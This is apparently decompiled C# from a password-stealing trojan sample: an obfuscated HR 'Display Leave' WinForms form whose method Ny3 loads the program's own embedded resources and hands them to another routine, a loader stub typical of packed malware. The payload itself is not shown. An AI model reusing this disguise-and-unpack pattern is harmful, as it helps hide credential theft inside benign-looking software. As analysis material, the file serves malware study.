// Decompiled with JetBrains decompiler
// Type: Bz9.Sb0
// Assembly: k3F4, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EF2862A8-7088-4F2B-ADD5-AFDC446098D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-ee71029a7b3d9d85e7a6c7c0ecc35d93ee37514713ba5033d491a0d7506e947b.exe

using An9;
using k5FS;
using k8ZQ;
using Microsoft.VisualBasic.CompilerServices;
using Pz9;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.Linq;
using System.Drawing;
using System.Drawing.Printing;
using System.Linq;
using System.Linq.Expressions;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using x7X;
using z0R5;

namespace Bz9
{
  [DesignerGenerated]
  public class Sb0 : Form
  {
    private IContainer Ⴄ;
    [AccessedThroughProperty("Ⴍ")]
    private Label Ⴅ;
    [AccessedThroughProperty("Ⴃ")]
    private DataGridView Ⴜ;
    [AccessedThroughProperty("Ⴐ")]
    private Label ႳႳ;
    [AccessedThroughProperty("Ⴀ")]
    private Label ႳႨ;
    [AccessedThroughProperty("Ⴓ")]
    private Button ႳႰ;
    [AccessedThroughProperty("Ⴗ")]
    private Label ႳႣ;
    private Gy8k.q4CY Ⴍ;

    public Sb0()
    {
      this.Load += new EventHandler(this.Ys4);
      this.Shown += new EventHandler(this.Bq2);
      this.Dq2();
    }

    protected virtual void Cg1([In] bool obj0)
    {
      try
      {
        if (!obj0 || this.Ⴄ == null)
          return;
        this.Ⴄ.Dispose();
      }
      finally
      {
        this.Dispose(obj0);
      }
    }

    private void Dq2()
    {
      this.Ⴍ = new Label();
      this.Ⴃ = new DataGridView();
      this.Ⴈ = new ComboBox();
      this.Ⴐ = new Label();
      this.Ⴀ = new Label();
      this.Ⴓ = new Button();
      this.Ⴗ = new Label();
      ((ISupportInitialize) this.Ⴃ).BeginInit();
      this.SuspendLayout();
      this.Ⴍ.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.Ⴍ.Location = new Point(22, 408);
      this.Ⴍ.Name = "lblCount";
      this.Ⴍ.Size = new Size(119, 25);
      this.Ⴍ.TabIndex = 5;
      this.Ⴍ.Text = "X records(s)";
      this.Ⴃ.AllowUserToAddRows = false;
      this.Ⴃ.AllowUserToDeleteRows = false;
      this.Ⴃ.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.Ⴃ.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
      this.Ⴃ.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
      this.Ⴃ.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
      this.Ⴃ.Location = new Point(27, 58);
      this.Ⴃ.Margin = new Padding(3, 4, 3, 4);
      this.Ⴃ.Name = "dgvLeave";
      this.Ⴃ.ReadOnly = true;
      this.Ⴃ.RowTemplate.Height = 24;
      this.Ⴃ.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
      this.Ⴃ.Size = new Size(831, 328);
      this.Ⴃ.TabIndex = 4;
      this.Ⴈ.DropDownStyle = ComboBoxStyle.DropDownList;
      this.Ⴈ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴈ.FormattingEnabled = true;
      this.Ⴈ.Items.AddRange(new object[4]
      {
        (object) "Pending",
        (object) "Rejected",
        (object) "Approved",
        (object) "All"
      });
      this.Ⴈ.Location = new Point(27, 22);
      this.Ⴈ.Margin = new Padding(3, 4, 3, 4);
      this.Ⴈ.Name = "cboLeave";
      this.Ⴈ.Size = new Size(136, 28);
      this.Ⴈ.TabIndex = 3;
      this.Ⴐ.BackColor = SystemColors.ControlDarkDark;
      this.Ⴐ.BorderStyle = BorderStyle.FixedSingle;
      this.Ⴐ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴐ.ForeColor = Color.DarkBlue;
      this.Ⴐ.Location = new Point(346, 18);
      this.Ⴐ.Name = "lblID";
      this.Ⴐ.Size = new Size(146, 28);
      this.Ⴐ.TabIndex = 6;
      this.Ⴀ.BackColor = SystemColors.ControlDarkDark;
      this.Ⴀ.BorderStyle = BorderStyle.FixedSingle;
      this.Ⴀ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴀ.ForeColor = Color.DarkBlue;
      this.Ⴀ.Location = new Point(516, 18);
      this.Ⴀ.Name = "lblName";
      this.Ⴀ.Size = new Size(146, 28);
      this.Ⴀ.TabIndex = 7;
      this.Ⴓ.BackColor = Color.IndianRed;
      this.Ⴓ.Cursor = Cursors.Hand;
      this.Ⴓ.DialogResult = DialogResult.Cancel;
      this.Ⴓ.Font = new Font("Modern No. 20", 10.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴓ.ForeColor = SystemColors.ControlLightLight;
      this.Ⴓ.Location = new Point(744, 6);
      this.Ⴓ.Margin = new Padding(3, 4, 3, 4);
      this.Ⴓ.Name = "Button1";
      this.Ⴓ.Size = new Size(115, 45);
      this.Ⴓ.TabIndex = 8;
      this.Ⴓ.Text = "&Close";
      this.Ⴓ.UseVisualStyleBackColor = false;
      this.Ⴗ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴗ.Location = new Point(201, 18);
      this.Ⴗ.Name = "Label1";
      this.Ⴗ.Size = new Size(130, 28);
      this.Ⴗ.TabIndex = 9;
      this.Ⴗ.Text = "Welcome HR !";
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.GradientActiveCaption;
      this.CancelButton = (IButtonControl) this.Ⴓ;
      this.ClientSize = new Size(896, 452);
      this.Controls.Add((Control) this.Ⴗ);
      this.Controls.Add((Control) this.Ⴓ);
      this.Controls.Add((Control) this.Ⴀ);
      this.Controls.Add((Control) this.Ⴐ);
      this.Controls.Add((Control) this.Ⴍ);
      this.Controls.Add((Control) this.Ⴃ);
      this.Controls.Add((Control) this.Ⴈ);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Margin = new Padding(3, 2, 3, 2);
      this.Name = "ႭႠ";
      this.Text = "DisplayLeave";
      ((ISupportInitialize) this.Ⴃ).EndInit();
      this.ResumeLayout(false);
    }

    internal virtual Label Ⴍ
    {
      get => this.Ⴅ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴅ = value;
    }

    internal virtual DataGridView Ⴃ
    {
      get => this.Ⴜ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set
      {
        object obj = (object) new DataGridViewCellEventHandler(this.Qn3);
        Control ⴜ1 = (Control) this.Ⴜ;
        if ((DataGridView) ⴜ1 != null)
          (ⴜ1 as DataGridView).CellDoubleClick -= (DataGridViewCellEventHandler) obj;
        this.Ⴜ = value;
        Control ⴜ2 = (Control) this.Ⴜ;
        if (!(ⴜ2 is DataGridView))
          return;
        ((DataGridView) ⴜ2).CellDoubleClick += (DataGridViewCellEventHandler) obj;
      }
    }

    internal virtual ComboBox Ⴈ
    {
      get => this.Ⴍ.Ⴀ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set
      {
        object obj = (object) new EventHandler(this.d2Z);
        ListControl ⴀ1 = (ListControl) this.Ⴍ.Ⴀ;
        if (ⴀ1 is ComboBox)
          (ⴀ1 as ComboBox).SelectedIndexChanged -= obj as EventHandler;
        this.Ⴍ.Ⴀ = value;
        ListControl ⴀ2 = (ListControl) this.Ⴍ.Ⴀ;
        if ((ComboBox) ⴀ2 == null)
          return;
        ((ComboBox) ⴀ2).SelectedIndexChanged += (EventHandler) obj;
      }
    }

    internal virtual Label Ⴐ
    {
      get => this.ႳႳ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႳႳ = value;
    }

    internal virtual Label Ⴀ
    {
      get => this.ႳႨ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႳႨ = value;
    }

    internal virtual Button Ⴓ
    {
      get => this.ႳႰ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set
      {
        object obj = (object) new EventHandler(this.r9T);
        ButtonBase ⴓⴐ1 = (ButtonBase) this.ႳႰ;
        if ((Button) ⴓⴐ1 != null)
          ⴓⴐ1.Click -= (EventHandler) obj;
        this.ႳႰ = value;
        ButtonBase ⴓⴐ2 = (ButtonBase) this.ႳႰ;
        if ((Button) ⴓⴐ2 == null)
          return;
        ⴓⴐ2.Click += (EventHandler) obj;
      }
    }

    internal virtual Label Ⴗ
    {
      get => this.ႳႣ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႳႣ = value;
    }

    private void Na2()
    {
      object obj = (object) new Sb0.g3G();
      ((Sb0.g3G) obj).Ⴀ = this.Ⴈ.Text;
      Table<w2M> ⴍ = new Tt1().Ⴍ;
      Expression expression = (Expression) Expression.Parameter(typeof (w2M), "c");
      // ISSUE: method reference
      // ISSUE: field reference
      // ISSUE: method reference
      // ISSUE: method reference
      // ISSUE: field reference
      Expression<Func<w2M, bool>> predicate = Expression.Lambda<Func<w2M, bool>>((Expression) Expression.Or((Expression) Expression.Equal((Expression) Expression.Call((Expression) null, (MethodInfo) MethodBase.GetMethodFromHandle(__methodref (Operators.CompareString)), new Expression[3]
      {
        (Expression) Expression.Field((Expression) Expression.Constant((object) (obj as Sb0.g3G), typeof (Sb0.g3G)), FieldInfo.GetFieldFromHandle(__fieldref (Sb0.g3G.Ⴀ))),
        (Expression) Expression.Constant((object) "All", typeof (string)),
        (Expression) Expression.Constant((object) false, typeof (bool))
      }), (Expression) Expression.Constant((object) 0, typeof (int)), false, (MethodInfo) null), (Expression) Expression.Equal((Expression) Expression.Call((Expression) null, (MethodInfo) MethodBase.GetMethodFromHandle(__methodref (Operators.CompareString)), new Expression[3]
      {
        (Expression) Expression.Property(expression, (MethodInfo) MethodBase.GetMethodFromHandle(__methodref (w2M.Wb1a))),
        (Expression) Expression.Field((Expression) Expression.Constant((object) (Sb0.g3G) obj, typeof (Sb0.g3G)), FieldInfo.GetFieldFromHandle(__fieldref (Sb0.g3G.Ⴀ))),
        (Expression) Expression.Constant((object) false, typeof (bool))
      }), (Expression) Expression.Constant((object) 0, typeof (int)), false, (MethodInfo) null)), (ParameterExpression) expression);
      object source = (object) ⴍ.Where<w2M>(predicate);
      this.Ⴃ.DataSource = (object) (IQueryable<w2M>) source;
      this.Ⴍ.Text = ((IQueryable<w2M>) source).Count<w2M>().ToString("0 record(s)");
      this.Ⴍ.ForeColor = Color.Red;
    }

    private void Ys4([In] object obj0, [In] EventArgs obj1)
    {
      En6.Ⴈ.Ⴓ.Text = "Human Resource Management System (HR)- Display Leave";
      this.Ⴈ.Text = "All";
      this.Ⴐ.Text = Ec63.Ⴅ;
      this.Ⴀ.Text = Ec63.Ⴀ;
      ICloneable cloneable = (ICloneable) new Font("Times New Roman", 12f, FontStyle.Bold);
      this.Na2();
      En6.Ⴈ.Ⴓ.Ⴜ.Enabled = true;
      En6.Ⴈ.Ⴓ.ႠႥ.Enabled = true;
    }

    private void d2Z([In] object obj0, [In] EventArgs obj1) => this.Na2();

    private void Qn3([In] object obj0, [In] DataGridViewCellEventArgs obj1)
    {
      int rowIndex = obj1.RowIndex;
      if (rowIndex > -1 & Operators.CompareString(Conversions.ToString(this.Ⴃ.Rows[rowIndex].Cells[6].Value), "Pending", false) == 0)
      {
        IComparable<string> comparable = (IComparable<string>) Conversions.ToString(this.Ⴃ.Rows[rowIndex].Cells[0].Value);
        En6.Ⴈ.Ⴅ.ႨႤ = Conversions.ToString(this.Ⴃ.Rows[rowIndex].Cells[5].Value).ToString();
        En6.Ⴈ.Ⴅ.ႨႥ = comparable as string;
        En6.Ⴈ.Ⴓ.Pg6f((Form) En6.Ⴈ.Ⴅ);
      }
      En6.Ⴈ.Ⴅ.Mx6s((Form) En6.Ⴈ.Ⴀ);
    }

    private void Bq2([In] object obj0, [In] EventArgs obj1)
    {
      this.Ⴐ.Text = Ec63.Ⴅ;
      this.Ⴀ.Text = Ec63.Ⴀ;
      En6.Ⴈ.Ⴓ.Ⴜ.Enabled = true;
      En6.Ⴈ.Ⴓ.ႠႥ.Enabled = true;
    }

    private void r9T([In] object obj0, [In] EventArgs obj1) => En6.Ⴈ.Ⴓ.Pg6f((Form) En6.Ⴈ.Ⴗ);

    [STAThread]
    public static void Ny3()
    {
      try
      {
        object obj = (object) new List<object>();
        int count1 = ((List<object>) obj).Count;
        while (count1 <= 0)
        {
          checked { ++count1; }
          ((List<object>) obj).Add((object) count1);
        }
        ((List<object>) obj).Add((object) Assembly.LoadFrom(Application.ExecutablePath));
        ((List<object>) obj).Add(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((obj as List<object>)[1], (System.Type) null, "GetManifestResourceNames", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
        if ((obj as List<object>)[2] == null || ((List<object>) obj).Count <= 2)
          return;
        Xn72.Kb3((List<object>) obj);
        int count2 = (obj as List<object>).Count;
        if (count2 <= 0)
          return;
        Math.Abs(checked (count2 * 25 * 25));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    internal sealed class g3G
    {
      public string Ⴀ;

      [StructLayout(LayoutKind.Auto)]
      internal struct Yc5
      {
        internal IContainer Ⴗ;
        internal ComboBox Ⴅ;
        internal Label Ⴄ;
        internal Label Ⴈ;
        internal Button Ⴍ;
        internal Button Ⴓ;
        internal PrintDocument Ⴀ;
      }

      internal sealed class Xa8
      {
        internal PropertyChangedEventHandler Ⴃ;

        internal Xa8()
        {
        }
      }
    }
  }
}
